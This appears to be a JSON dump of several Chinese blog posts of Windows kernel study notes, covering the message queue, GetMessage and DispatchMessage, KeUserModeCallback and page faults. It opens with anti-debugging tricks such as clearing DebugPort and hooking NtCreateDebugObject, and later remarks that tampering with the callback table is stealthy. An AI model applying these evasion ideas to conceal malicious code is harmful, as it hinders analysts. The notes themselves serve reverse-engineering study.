清零DebugPort，只要起一个线程不断的检查当前进程的DebugPort，一旦有值就退出程序或者将其清零，这样可以中断调试对象与被调试进程的联系，以达到反调试的目的。 遍历所有进程TEB+0xF24处，看有没有值，若有值，一定就是调试器，则退出程序。 Hook NtCreateDebugObject，不让它创建调试对象。 反反调试有反调试，自然就有反反调试，正所谓道高一尺魔高一丈，针对各类反调试手段，也会衍生出各类的反反调试，攻防领域永远都在交替上升： 针对Hook NtCreateDebugObject的反调试方式，可以自己分配一个内存给_DEBUG_OBJECT，并为它的成员赋值。 针对清零DebugPort的反调试方式，可以不使用DebugPort的位置，在进程中另找一个区域存放_DEBUG_OBJECT的地址。把原先+0xbc的值都选为新的偏移处。 重写整个DebugActiveProcess函数。 参考资料参考教程： 海哥逆向中级预习班 参考链接 https://blog.csdn.net/weixin_42052102/article/details/83624513 （My classmates-调试对象笔记）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"内核回调机制","slug":"内核回调机制","date":"2020-09-10T14:47:07.000Z","updated":"2022-05-17T15:34:26.599Z","comments":true,"path":"2020/09/10/内核回调机制/","link":"","permalink":"http://cata1oc.github.io/2020/09/10/%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E6%9C%BA%E5%88%B6/","excerpt":"","text":"谁调用了窗口过程先来看一个问题，谁调用了窗口过程？根据前面的学习，可以得出： GetMessage()在处理SentMessagesListHead中消息时，会调用窗口过程。 DispatchMessage()在处理其它队列中的消息时，会调用窗口过程。 但实际上还有一种，就是内核代码本身会调用窗口处理函数。 （实验：注释掉DispatchMessage()，设置WM_CREATE类型消息的窗口处理函数，看是否会被调用。此处省略，以后补上） 这是什么原理呢？在调用CreateWindow()时，必然会进入0环调用NtUserCreateWindowEx()，这个函数会调用内核回调函数向窗口发送消息（在窗口创建出来之前），而这个消息甚至不会出现在消息队列中，而是通过内核回调函数发送给窗口过程函数，消息类型属于WM_CREATE。NtUserCreateWindowEx()之所以这样设计是因为，如果程序需要在窗口创建之时就做一些事情，但窗口没创建出来时它是接收不了消息的，因此就有了这样的设计，在窗口创建前就调用WM_CREATE消息对应的窗口过程函数。利用这一点，即使没有DispatchMessage()也会有消息调用窗口过程。这就是第三种调用窗口过程的情况。 内核回调机制从0环调用3环函数的几种方式先来看一下，0环调用3环函数有哪几种方式： 用户APC的执行 用户异常的处理（内核调试器与用户调试器均不存在或不处理的情况下，会从Ring0进入Ring3） 内核回调（Ring0代码调用窗口过程函数） KeUserModeCallback先来回顾一个函数KeUserModeCallback，这个函数之前已经出现过2次，GetMessage()底层调用的NtUserGetMessage()会在一个循环里调用KeUserModeCallback()来处理SentMessagesListHead队列中的消息；同样，DispatchMessage()底层调用的NtUserDispatchMessage()也是如此，这里简单看一下NtUserDispatchMessage()的调用关系。 首先NtUserDispatchMessage()会调用IntDispatchMessage() 其次IntDispatchMessage()内部又会调用co_IntCallWindowProc() 最后co_IntCallWindowProc()会调用KeUserModeCallback() 显然，NtUserDispatchMessage最终也要通过调用KeUserModeCallback()回到3环。现在可以确定KeUserModeCallback()就是内核回调机制下，0环回到3环的核心函数。以下为函数原型： c1234567NTSTATUS NTAPI KeUserModeCallback( IN ULONG RoutineIndex, IN PVOID Argument, IN ULONG ArgumentLength, OUT PVOID * Result, OUT PULONG ResultLength ) 有两个参数较为重要，一个是Argument，另一个是RoutineIndex。先来看Argument 顾名思义，Argument主要负责提供参数，包括提供窗口过程函数的地址。而另一个参数RoutineIndex则与落脚点有关。 回到3环的落脚点关于落脚点，在处理用户APC与用户异常时，0环回到3环的落脚点是确定的： APC：ntdll!KiUserApcDispatcher 异常：ntdll!KiUserExceptionDispatcher 而内核回调的3环落脚点比较特殊，前面提到了RoutineIndex的值与落脚点有关，先来看它的取值： 在callback.h的头文件中，可以看到RoutineIndex有至少18个取值，这些取值就相当于索引。用来在回调函数表中定位返回3环的落脚点。回调函数表包含多个回调函数，供0环的KeUserModeCallback()调用，这些回调函数均由user32.dll提供，回调函数表位置如下： c1fs[0] -> TEB -> PEB(TEB+0x30) -> 回调函数表(PEB+0x2C) 下面任意打开一个进程，查看进程的回调函数表： 这就是回调函数表，基本上每个进程都有。而KeUserModeCallback()的参数RoutineIndex就是在表中的索引，若值为0，3环落脚点就是表中第一个函数；若值为1，落脚点就是表中第二个函数，以此类推。 确定落脚点后，KeUserModeCallback()便会通过落脚点函数进入3环，接下来，落脚点函数会从Argument中取出窗口过程函数的地址，并完成调用。 小聪明内核回调机制是非常适合做手脚的地方之一，比起Hook异常或者APC的处理函数，或者在它们返回0环时对TrapFrame做手脚，对回调函数表中的函数做手脚要隐蔽的多，首先这些回调函数是直接从0环发起调用的，并且没有线程的信息，什么时候调用也很难查出来。如果手动写一个驱动，自己在0环发起调用，那隐蔽性就更高了。 消息机制总结到目前位置，消息机制的内容就差不多完结了。由于时间问题，一些实验并没有完成，所以这个专题更像是对知识点的总结，在二刷时会有所补充，在这里就先把这个系列的核心内容总结一下，以后看着会方便很多。 消息队列： 引入消息队列的概念 找到消息队列的方式：KTHREAD.Win32Thread.THREADINFO.MessageQueue，非GUI线程Win32Thread的值为空 了解GUI线程：调用图形界面API的线程就会变成GUI线程 窗口与线程： 了解窗口的创建与窗口句柄：窗口是在0环创建的；窗口句柄是全局的。 窗口与线程的关系：一个线程可以有多个窗口，但每个窗口只能属于一个线程。 消息的接收： GetMessage：1.接收消息；2.处理SendMessage发来的消息（位于SentMessagesListHead队列中） 消息的分发： TranslateMessage：翻译键盘发来的消息。 DispatchMessage：处理其它队列中的消息。 默认的窗口过程处理函数DefWindowProc 内核回调机制： 0环如何回调3环窗口过程函数 参考资料参考教程： 海哥逆向中级预习班 参考链接： https://blog.csdn.net/weixin_42052102/article/details/83826893 （My classmates-内核回调机制笔记）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"消息的分发","slug":"消息的分发","date":"2020-09-09T08:06:31.000Z","updated":"2022-05-17T15:34:02.459Z","comments":true,"path":"2020/09/09/消息的分发/","link":"","permalink":"http://cata1oc.github.io/2020/09/09/%E6%B6%88%E6%81%AF%E7%9A%84%E5%88%86%E5%8F%91/","excerpt":"","text":"要点回顾前篇学习了关于消息的接收，主要是围绕GetMessage函数展开的，了解到GetMessage函数不仅仅读取消息，还会处理SentMessagesListHead队列中的消息。并且消息队列不止一个，共有七个。本篇学习了解消息的分发，主要是围绕DispatchMessage展开。 核心逻辑关于处理窗口消息的核心逻辑如下，这里再回顾下： c123456MSG msg; while(GetMessage(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); } 其它队列的消息处理消息队列共有7个队列，现在已经知道GetMessage可以用来处理SentMessagesListHead中的消息，也就是SendMessage函数发来的消息，那么仍然有6个队列的消息未被处理。 DispatchMessage（实验：注释掉DispatchMessage函数后运行窗口程序并给窗口发送消息，这里省略代码及实验过程，以后补上） 在注释掉DispatchMessage函数的情况下，对于窗口的任何操作（鼠标点击或者敲击键盘）始终是没有反应的，显然没有了DispatchMessage函数，除SendMessage发送的消息外均无法被处理。 现在可以确认DispatchMessage是用来处理其余队列中消息的函数，但想要了解本质，就得进一步跟进这个函数。 （这里省略跟进过程，比较简单，所以不想跟了） 不用想，这个DispatchMessage肯定是没有做处理的，因为这个函数根本没有进入0环，而窗口对应的结构体_WINDOW_OBJECT位于0环，不进入0环，怎么调用窗口过程函数的呢？所以DispatchMessage只是一个入口，用来调用win32k.sys中提供的函数NtUserDispatchMessage。这个函数完成了对消息的分发，它做了下面2件事： 根据窗口句柄找到窗口对象_WINDOW_OBJECT。 根据窗口对象得到窗口过程函数，由0环发起调用。 这样也产生了两个问题，第一，窗口句柄哪里来？第二，如何从0环发起调用？关于从0环发起调用，与GetMessage一样，都是调用一个叫做KeUserModeCallback的回调函数进入3环，再去调用窗口过程函数。至于窗口句柄，DispatchMessage只有一个参数msg，所以就要把目光放在msg上了。 Msg结构体DispatchMessage只有一个参数msg，其结构如下： c123456789//msgtypedef struct tagMSG { HWND hwnd; UINT message; WPARAM wParam; LPARAM lParam; DWORD time; POINT pt; } MSG; 可以看到这个msg里面，第一个成员就是窗口句柄，表明当前消息是发给哪个窗口的，前面说过，窗口句柄与内核对象句柄类似，都是提供给3环用的，DispatchMessage在调用了NtUserDispatchMessage后，就可以通过窗口句柄在窗口句柄表中找到对应_WINDOW_OBJECT结构体的地址，从而调用窗口回调函数，完成消息的分发。 消息的转换DispatchMessage是用来消息的分发的，那么TranslateMessage有啥用呢？顾名思义，TranslateMessage起到翻译的作用，相当于一种优化。 （实验：分别构造WM_KEYDOWN与WM_CHAR两个回调函数，测试注释掉TranslateMessage函数的情况，此处省略，以后补上） 经过测试就可以发现，TranslateMessage是针对键盘类消息的一种优化，如果没有TranslateMessage，那么键盘消息属于WM_KEYDOWN类型，打印出来为ASCII对应的10进制的值，而使用TranslateMessage后，键盘消息会被转换成WM_CHAR类型，打印出来的就是键盘上按下的符号。所以有没有TranslateMessage影响不大，只是对消息的类型进行转换。 默认的消息处理函数在窗口与线程一篇中就看到过，每时每刻的消息是非常多的，而又不能给每一种消息写一个窗口过程函数，那样太程序就臃肿了，所以一般来说，我们只对关注的消息设计窗口过程函数，其它消息可以交予Windows来管理。Windows也提供了默认的窗口过程函数，放在Default语句中即可： c12//默认窗口过程处理函数return DefWindowProc(hWnd, uMsg, wParam, lParam); 总结 DispatchMessage用于消息的分发，具体实现由底层的NtUserDispatchMessage完成，参数msg提供窗口句柄。 TranslateMessage用于对键盘消息的转换。 大部分消息可以交由默认窗口过程处理函数DefWindowProc进行处理。 参考资料参考教程： 海哥逆向中级预习班 参考链接： https://blog.csdn.net/weixin_42052102/article/details/83787929 （My classmates-消息机制学习笔记）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"消息的接收","slug":"消息的接收","date":"2020-09-08T01:43:16.000Z","updated":"2022-05-17T15:33:26.346Z","comments":true,"path":"2020/09/08/消息的接收/","link":"","permalink":"http://cata1oc.github.io/2020/09/08/%E6%B6%88%E6%81%AF%E7%9A%84%E6%8E%A5%E6%94%B6/","excerpt":"","text":"要点回顾前两篇关于消息机制的学习主要介绍了以下2点： 一个GUI线程有一个消息队列 Code1普通线程 -> GUI线程 -> THREAD.Win32Thread -> THREADINFO -> 消息队列 一个线程可以有多个窗口，所有窗口共享一个消息队列 Code12_WINDOW_OBJECT -> PTHREADINFO pti //所属线程 -> WNDPROC lpfnWndProc //窗口过程(窗口回调函数) 窗口的创建过程在3环创建窗口时，需要先创建并注册一个窗口类的对象，并注册窗口的样式，过程函数等。然后调用CreateWindow创建一个窗口。 而本质上，CreateWindow只不过是一个3环的接口，最终调用的是位于win32k.sys中的0环函数，并在0环给窗口创建一个_WINDOW_OBJECT结构体，每个窗口在0环都有这样一个结构体。 综上可以得出如下的结论：创建类对象与创建窗口的过程，本质上就是为创建一个_WINDOW_OBJECT结构作准备。 消息队列的结构在消息队列一篇中提到过，一旦线程调用win32k.sys提供的图形界面函数后，线程结构体中的成员Win32Thread就会指向一个结构体THREADINFO，该结构体中有一个成员MessageQueue就是消息队列，消息队列中包含7组队列（旧版ReactOS才有），用于处理不同类型的消息。 其中3个是比较常见的消息队列： SentMessagesListHead：接到SendMessage发来的消息。 PostedMessagesListHead：接到PostMessage发来的消息。 HardwareMessagesListHead：接到鼠标、键盘的消息。 GetMessage的功能在编写3环的窗口程序时，总会写如下一段代码： c123456MSG msg;while(GetMessage(&msg,NULL,0,0)){ TranslateMessage(&msg); //翻译消息 DispatchMessage(&msg); //分发消息} 其中GetMessage函数负责从7个队列中取消息，并让TranslateMessage与DispatchMessage翻译并分发消息。但GetMessage函数真的只负责取消息吗？ 本篇研究消息的接收，我们知道消息会先进入7个队列中，而TranslateMessage与DispatchMessage又是处理消息的，所以研究的重点就在GetMessage上。先来看函数原型： c123456GetMessage( LPMSG lpMsg, //返回从队列中摘下来的消息 HWND hWnd, //过滤条件一：指定接收消息的窗口 UNIT wMsgFilterMin, //过滤条件 UNIT wMsgFilterMax //过滤条件); GetMessage有4个参数，其中3个都是过滤条件，包括指定接收消息的窗口；另一个就从队列中取得的消息。所以表面上，GetMessage通过循环判断是否有该窗口的消息，如果有，将消息存储到MSG结构中，并将消息从原先的消息队列中（7个队列中的某个）删除。接下来，将消息交给TranslateMessage与DispatchMessage去处理。 DispatchMessage通常就是将消息转发至窗口过程函数，从而使得过程函数被调用。但实际上，GetMessage也会消息进行处理。 （实验：测试只保留GetMessage的情况下是否能够执行窗口回调函数。此处省略，以后补上……） 为什么说GetMessage也会对消息进行处理呢？这里没有实验，就直接说明一下好了，GetMessage调用的是win32k.sys中的NtUserGetMessage函数，在NtUserGetMessage函数内部有如下逻辑（ReactOS版本不对没找到，IDA中跟了一下也没找到，所以就直接按着海哥分析的结果来）： c123456789101112131415do{ //先判断SentMessagesListHead是否有消息 如果有处理掉 do { .... KeUserModeCallback(USER32_CALLBACK_WINDOWPROC, Arguments, ArgumentLength, &ResultPointer, &ResultLength); .... }while(SentMessagesListHead != NULL) //依次判断其他的6个队列，里面如果有消息 返回 没有继续}while(其他队列!=NULL) 在一个内部的do…while循环中，NtUserGetMesssage会先判断SentMessagesListHead中是否有消息，如果有的话，就调用窗口回调函数处理掉。接着直到处理完SentMessagesListHead中的所有消息后，才会判断其它6个队列中的消息，此时就不会对这些消息作处理了，而是直接将消息返回。所以，GetMessage也是会对消息进行处理的，但是只对SentMessagesListHead中的消息作处理。 SendMessage与PostMessage这两个函数都是像窗口发送消息的函数，区别是SendMessage是同步的，而PostMessage是异步的。 （实验：分别发送SendMessage与PostMessage到一个注释掉DispatchMessage函数的窗口。此处省略，以后补上……） 这里实验省略，直接说结论： SendMessage发送消息，GetMessage接收时会进入0环遍历SentMessagesListHead是否有消息，有就处理，没有就返回。有消息就必须处理完才返回，SendMessage要接收到对方执行完并返回处理结果才会结束，否则会一直堵塞在这。 PostMessage发送消息，GetMessage只会接收它的消息，不会处理，它的消息由TranslateMessage与DispatchMessage来处理。PostMessage不会等待对方返回处理结果，发完就立马结束。 总结 GetMessage除了接收消息外，还会处理SentMessagesListHead队列中的消息。 SendMessage与消息处理是同步的，会等待处理结果。PostMessage与消息处理是异步的，发完就结束执行。 消息这部分干货不多，一个是Windbg没有很多结构的符合，网上找又没找到相应的ReactOS版本，很多结构的值也不对，想从IDA跟进，一个是没有指点，方向不好找，另一个是也有很多不同。再一个是自身也懒了，一些3环的创建窗口程序等实验，也都没有做，今天11月15日，还差的很多，另一个就是17号Windows就过期了，虽然没有大的影响，但还是希望能尽早结束，到了调试的部分，会好好弄，也争取调试弄完时可以追到60左右。 参考资料参考教程： 海哥逆向中级预习班 参考链接： https://blog.csdn.net/weixin_42052102/article/details/83787929 （My classmates-消息机制）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"窗口与线程","slug":"窗口与线程","date":"2020-09-07T00:56:59.000Z","updated":"2022-05-17T15:32:24.986Z","comments":true,"path":"2020/09/07/窗口与线程/","link":"","permalink":"http://cata1oc.github.io/2020/09/07/%E7%AA%97%E5%8F%A3%E4%B8%8E%E7%BA%BF%E7%A8%8B/","excerpt":"","text":"前言前一篇，弄清楚了消息队列与线程的关系，简单来说就是，一个GUI线程对应一个消息队列。什么是GUI，什么是消息队列，参考这里，本篇不再赘述。本篇将解决以下3个问题： 消息从哪里来？ 消息到哪里去？ 谁来做这些事情？ 消息从哪里来进入正题，首先讨论消息从哪里来。 鼠标消息、键盘消息 这张图源于VC++6.0的插件，Spy++，它可以捕捉窗口所接收到的消息。当把鼠标放在窗口上时，移动或者点击，则会接收到鼠标发送的消息，敲击键盘则会接收到键盘发送的消息（图中未显示，测试时消息界面会显示敲击下的键盘符号）。 其它进程消息另一种情况是其它进程发送的消息。使用CreateWindow创建一个窗口，会获得一个窗口句柄，之前在句柄表中曾提过，此句柄非彼句柄，之前说到的句柄属于内核对象的句柄，而今天提到的句柄则是窗口句柄，相同的是这两类句柄都只是一个编号，用于给3环使用的。窗口句柄的特点，它是全局的，因此只要获取到窗口的句柄，任意进程都可以通过SendMessage或者PostMessage函数给这个窗口发送消息进行交互。 结论 消息来源于鼠标，键盘以及其它进程。 消息到哪里去根据上面的分析，消息会因为鼠标，键盘，以及其它进程与某一个窗口交互时产生，所以表面上来说，消息会到窗口。窗口又是什么呢？ 窗口的形成通常创建窗口使用CreateWindow函数，它有CreateWindowA（ASCII）与CreateWindowW（Unicode）两个宏，会根据当前使用的编码自动调用其中的一种。这两个宏最终都会调用CreateWindowEx，CreateWindowEx的内部调用如下： 调用_VerNtUserCreateWindowEx 调用_NtUserCreateWindow 进入_NtUserCreateWindow内部 这个函数是进入0环的入口，可以得出两点信息： 窗口的创建是在0环 系统服务号大于0x1000，因此调用的是第二张系统服务表指向的函数地址表中的函数，属于Win32k.sys。 InitInputImpl函数创建窗口必然要调用win32k.sys中的服务，在初始化Win32k.sys的服务时，会调用一个函数InitInputImpl，其原型如下： c12345678910111213141516171819202122NTSTATUS FASTCALL InitInputImpl(VOID){ NTSTATUS Status; KeInitializeEvent(&InputThreadsStart, NotificationEvent, FALSE); MasterTimer = ExAllocatePoolWithTag(NonPagedPool, sizeof(KTIMER), TAG_INPUT); KeInitializeTimer(MasterTimer); Status = PsCreateSystemThread(&RawInputThreadHandle,THREAD_ALL_ACCESS,NULL,NULL, &RawInputThreadId,RawInputThreadMain,NULL); //键盘输入线程：KeyboardThreadMain Status = PsCreateSystemThread(&KeyboardThreadHandle,THREAD_ALL_ACCESS,NULL,NULL, &KeyboardThreadId,KeyboardThreadMain,NULL); //鼠标输入线程：MouseThreadMain Status = PsCreateSystemThread(&MouseThreadHandle,THREAD_ALL_ACCESS,NULL,NULL, &MouseThreadId,MouseThreadMain,NULL); InputThreadsRunning = TRUE;//标志现在可以开始读取键盘鼠标输入 KeSetEvent(&InputThreadsStart, IO_NO_INCREMENT, FALSE); return STATUS_SUCCESS;} InitInputImpl会在0环创建2个线程，一个监控键盘，另一个监控鼠标，并将消息存储到对应线程的消息队列中。这也能解释为什么有时候程序突然卡死了，但是鼠标还可以动，原因是鼠标有着自己独立的线程。 结论 窗口是通过调用win32k.sys系统服务在0环创建的。 初始化win32k.sys会调用InitInputImpl函数，InitInputImpl创建的监控线程会将消息存储到对应线程的消息队列中。 窗口找消息队列现在知道消息从哪来，以及消息会到哪去，接下来就会有一个问题，如何通过窗口找到消息队列。 由图，打开3个窗口，鼠标进行点击与移动，操作系统是怎样准确的将消息发送给不同窗口对应的消息队列的呢？ 首先，这张图上不止是3个窗口，每个进程窗口内部的按钮，表格，都属于窗口，所以一个进程可以有多个窗口，但是这些窗口只能属于一个进程。 前面提到窗口是进入0环后通过win32k.sys提供的服务画出来的，所以，窗口其实是个0环的结构。与进程，线程类似，它们都有对应的内核结构体EPROCESS与ETHREAD，窗口也有自己对应的内核结构体_WINDOW_OBJECT。可惜的是，这个结构体并没有通过符号表导出，我在网上搜也没能搜到，所以只能根据海哥所说的来看。 窗口对象_WINDOW_OBJECT中有一个成员pti，类型是PTHREADINFO，指向THREADINFO结构，就是前一篇讲到的Win32Thread指向的结构。这样就将线程与窗口联系起来了。原本KTHREAD.Win32Thread处指向的值为空，当线程调用win32k.sys中的函数创建一个窗口后，Win32Thread就会指向THREADINFO结构体，该线程也由普通线程变成了GUI线程，此时窗口对应的内核结构WINDOW_OBJECT中的成员pti也会指向这个结构体，而消息队列，正是位于这个结构体中，这样窗口就可以其所在线程的消息队列。 总结 窗口是在0环创建的。 窗口句柄是全局的。 一个线程可以有多个窗口，但每个窗口只能属于一个线程。 参考资料参考教程： 海哥逆向中级预习班 参考链接： https://blog.csdn.net/weixin_42052102/article/details/83787929 （My classmates-消息机制学习笔记）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"消息队列","slug":"消息队列","date":"2020-09-06T05:42:20.000Z","updated":"2022-05-17T15:31:53.810Z","comments":true,"path":"2020/09/06/消息队列/","link":"","permalink":"http://cata1oc.github.io/2020/09/06/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/","excerpt":"","text":"前言在初级班时曾学习过Win32相关API的用法，可以自己编写一些窗口界面，向窗口发送消息实现交互。但仍然有些问题是无法回答的： 什么是窗口句柄？在哪里？有什么用？ 什么是消息？什么是消息队列？消息队列在哪？ 什么是窗口过程？窗口过程是谁调用的？没有消息循环窗口过程会执行吗？ 为什么要有w32k.sys这个模块？ 为什么只有使用图形界面的程序才可以访问KeServiceDescriptorTableShadow？ 界面”卡死”的时候为什么鼠标还可以动？ 为了弄清楚这些问题，就必须进入0环，从底层弄清楚消息机制的本质，本篇从消息队列开始介绍。 什么是消息队列先来看一个小实验，编写运行如下代码（环境：Windows XP，编译器：VC++6.0）： c1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889// MessageQueue.cpp : Defines the entry point for the console application.//#include \"stdafx.h\"#define _WIN32_WINNT 0x0500#include typedef struct _Color{ DWORD r,g,b;}Color;typedef struct _WindowClass{ DWORD x; DWORD y; DWORD width; DWORD hight; Color color;}WindowClass;//画窗口void PaintWindows(HDC hdc,WindowClass* p){ //取图形对象 HBRUSH hBrush = (HBRUSH)GetStockObject(DC_BRUSH); //画刷 SelectObject(hdc,hBrush); SetDCBrushColor(hdc,RGB(p->color.r, p->color.g, p->color.b)); MoveToEx(hdc, p->x, p->y,NULL); LineTo(hdc, p->x+p->width, p->y); LineTo(hdc, p->x+p->width, p->y+p->hight); LineTo(hdc, p->x, p->y+p->hight); LineTo(hdc, p->x, p->y); Rectangle(hdc, p->x, p->y, p->x+p->width, p->y+p->hight+1); DeleteObject(hBrush);}void main(){ char cMessage; HWND hwnd; HDC hdc; //设置窗口参数 WindowClass wClass; wClass.x = 0; wClass.y = 0; wClass.width = 800; wClass.hight = 400; wClass.color.r = 0xEF; wClass.color.g = 0xEB; wClass.color.b = 0xDE; //画在哪 hwnd = GetDesktopWindow(); //获取DC设备句柄：可以把DC理解成显卡缓存 hdc = GetWindowDC(hwnd); for (;;) { //画窗口 PaintWindows(hdc, &wClass); //接收消息 cMessage = getchar(); switch (cMessage) { case 'a': wClass.color.r += 0x10; wClass.color.g += 0x10; wClass.color.b += 0x10; break; case 'b': wClass.color.r -= 0x10; wClass.color.g -= 0x10; wClass.color.b -= 0x10; break; } } getchar();} 代码逻辑不在此展开，默认是有Win32基础的，实验运行结果如下： 运行程序后，会在桌面的左上角画上一个窗口，接着我们可以通过发送消息来与窗口互动，当敲下“a”后，窗口的颜色会变深，敲下“b”后，窗口的颜色会变浅。 这是一个非常简单的交互程序，通过发送消息与窗口进行交互，但是这个代码有一个弊端，就是只能接收键盘发来的消息，对于鼠标亦或是其它进程发来的消息则无能为力。 想要能够接收并处理所有类型的消息，就必须有一个容器，而这个容器，就是消息队列。 消息队列放哪前面提到，得有一个消息队列，用来接收所有的消息，并分别处理，那么问题来了，这个消息队列放在什么位置？ 专用进程有一种思路是每个进程中放置一个消息队列，通过一个专用进程对不同类型的消息进行分发，如下图所示： Linux操作系统采用的就是这种方式，另起一个专用进程负责接收消息，并将消息发送至不同的进程中去处理。这种方法需要有一个专用进程对消息进行处理，避免不了造成过多的跨进程通信，显然会使效率有所降低。 内核存储微软使用了另一种策略，由于在0环中，不同进程的地址空间往往是相同的，利用这一点，就可以省去专用进程处理消息。 前面的实验中，我们通过手动画了一个窗口，Windows也提供了一部分图形界面API，尽管那些API的底层实现也是手动画图形界面。 在KThread+0x130处有一个成员Win32Thread 平时这个Win32Thread指向的值为空，一旦线程调用了图形界面API，它就会指向一个叫做_THREADINFO的结构体，消息队列就位于这个结构体中。根据ReactOS，THREADINFO结构如下： GUI线程当线程调用了图形界面API后，该线程的KTHREAD.Win32Thread就会指向一个叫做THREADINFO的结构，这个结构体中就包含了消息队列。此时这个线程不再是普通线程了，而是GUI线程。 当线程刚创建的时候，都是普通线程：Thread.ServiceTable -> KeServiceDescriptorTable（只有一张表可见） 当线程第一次调用Win32k.sys（图形界面API在0环的实现）时，会调用一个函数：PsConvertToGuiThread，这个函数主要做几件事： 扩充内核栈，必须换成64KB的大内核栈，因为普通内核栈只有12KB大小。 创建一个包含消息队列的结构体，并挂到KTHREAD上。 Thread.ServiceTable -> KeServiceDescriptorTableShadow（此时两张表均可见） 把需要的内存数据映射到本进程空间。 总结 消息队列存储在0环，通过KTHREAD.Win32Thread可以找到。 并不是所有线程都要消息队列，只有GUI线程才有消息队列 1个GUI线程对应1个消息队列。 参考资料参考教程： 海哥逆向中级预习班 参考链接： https://blog.csdn.net/weixin_42052102/article/details/83787929 （My classmates-消息机制学习笔记） https://reactos.org/wiki/Techwiki:Win32k/THREADINFO （ReactOS-Win32k/THREADINFO） https://doxygen.reactos.org/d9/df6/struct__THREADINFO.html （ReactOS-Struct THREADINFO）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"缺页异常","slug":"缺页异常","date":"2020-09-05T09:06:29.000Z","updated":"2022-05-17T15:31:28.539Z","comments":true,"path":"2020/09/05/缺页异常/","link":"","permalink":"http://cata1oc.github.io/2020/09/05/%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B8/","excerpt":"","text":"前言本篇学习缺页异常，缺页异常属于习惯叫法，本身是指与页相关的异常处理机制。 什么是缺页异常在学习PDE、PTE属性时介绍过P位，只有当PDE与PTE的P位均为1时，物理页才有效。当CPU访问一个地址，如果其PTE的P位为0，此时会产生缺页异常。缺页异常发生时，通过中断描述符表的e号中断进行处理。 异常不一定都是不好的，Windows系统运行的每一秒都在发生缺页异常，而恰恰是因为缺页异常的机制，Windows才能更加有效的利用物理页。假设当前操作系统的有效物理内存只有2M，如果一个线程通过VirtualAlloc函数申请了某个线性地址对应的物理页后就一直占据着它不释放，那么内存很快就会被占满，而线程又不是无时无刻执行着，它也可能sleep，进入等待队列中，却依然占据着物理页，这样内存的使用效率是非常低的。 内存交换与虚拟内存内存交换机制为了提高物理内存的使用效率，Windows引入了内存交换机制。其核心在于，只有正在被使用的线性地址才会被挂上物理页，如果一个线性地址隔了一段时间没有被使用，或者说当前的物理页快被使用完了，这时操作系统会将这些线性地址对应的物理页上的数据保存到硬盘上，并将线性地址对应PTE的P位设置为0。 虚拟内存那么，被交换到硬盘上的数据会保存到哪里呢？ 右键我的电脑 -> 属性 -> 高级 -> 性能 -> 设置 -> 高级 ->虚拟内存更改，就可以找到图中对虚拟内存的设置选项。这个虚拟内存有什么用呢？在C盘根目录下，有一个叫做pagefile.sys的文件（文件夹选项显示所有文件后可见），如下图所示 这个pagefile.sys文件的大小就是刚刚设置的虚拟内存的大小，并且从内存交换到硬盘上的数据也会存在这个文件中，所以这个文件被称作虚拟内存。 内存交换导致的缺页异常当操作系统将物理页上的数据保存到硬盘上时，也将该线性地址对应的PTE的P位设置成了0。一旦该线性地址再次被访问，由于P位为0，则会触发缺页异常。那么操作系统是如何处理的呢？ 当P位为0时，此时的PTE被称作无效PTE，有以下四种情形： 每种情形对应的处理情况也不相同，而此时，因内存交换导致的缺页异常，属于第一种情况（位于页面文件）。此时PTE的1-4位，5-9位，12-31位都有值，说明这个线性地址是有效的，只是数据位于硬盘上。异常处理程序（e号中断）会根据PTE上的描述，从pagefile.sys获取到数据内容，并将其取出挂到一个新的物理页上，将PTE的12-31设置为新的物理页地址，并将P位置1。缺页异常处理完毕，这类缺页异常的情况是非常多见的，无时无刻不在发生，但是作为用户来说是察觉不到异样的，程序始终是正常执行的。 保留与提交的误区回顾之前介绍的VirtualAlloc函数 c123456LPVOID VirtualAlloc{ LPVOID lpAddress, // 要分配的内存区域的地址 DWORD dwSize, // 分配的大小 DWORD flAllocationType, // 类型：MEM_RESERVE MEM_COMMIT DWORD flProtect // 该内存的初始保护属性}; 重点关注第三个参数flAllocationType，这个参数有两个取值，含义如下： MEM_RESERVE：申请内存时，仅保留线性地址，不分配物理页。 MEM_COMMIT：可以有物理页，但不是立即有或者一直有。 之前一直以为，申请内存时将fAllocationType设置为MEM_COMMIT就可以获得物理页了，但事实真是如此吗？下面做个小实验，编写运行下面的代码： c123456789101112131415#include \"stdafx.h\"#include \"windows.h\"int main(int argc, char* argv[]){ LPVOID pAddr = VirtualAlloc(NULL, 4096*8, MEM_COMMIT, PAGE_READWRITE); printf(\"未使用物理页时: %x\\n\", pAddr); getchar(); *(PDWORD)pAddr = 0x12345678; printf(\"写入数据后\\n\"); getchar(); return 0;} 第一次运行时，已经申请完内存并打印出对应的线性地址，但是此时还没有向申请的内存中写入数据，在Windbg中查看该线性地址的PTE。 先说明一下，这个!vtop指令，在给出Cr3和线性地址的情况下，会自动帮你计算PDE、PTE的值。可以看到，此时PTE的值是空的，没有指向任何物理页，尽管我们使用的是MEM_COMMIT作为fAllocationType的值，但是此时并没有给该线性地址分配任何物理页。接下来继续执行 